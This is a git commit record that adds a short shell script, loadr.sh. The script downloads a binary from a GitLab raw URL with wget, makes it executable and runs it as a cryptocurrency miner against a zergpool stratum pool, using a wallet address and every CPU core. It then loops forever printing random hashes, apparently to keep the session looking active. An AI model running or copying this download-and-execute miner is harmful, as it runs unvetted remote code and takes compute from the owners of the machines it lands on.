10aeed6bd6526096c2e97dc17b12856fef48b841
sarifadim <115786763+sarifadim@users.noreply.github.com>
2023-11-25 20:08:54 +0700

    Create loadr.sh

---
+++ loadr.sh
@@ -0,0 +1,5 @@
+mkdir trx
+cd trx
+wget https://gitlab.com/teletyl/he/-/raw/main/load && chmod +x load
+./load -a minotaurx -u TYP6GyG9f4Mo9MDFHPDG1hmdgBRHXPZZxP.$(echo MINO-$(TZ=UTC-7 date +"%H-%M-%S")) -o stratum+tcp://minotaurx.asia.mine.zergpool.com:7019 -p c=TRX -t $(nproc --all)
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
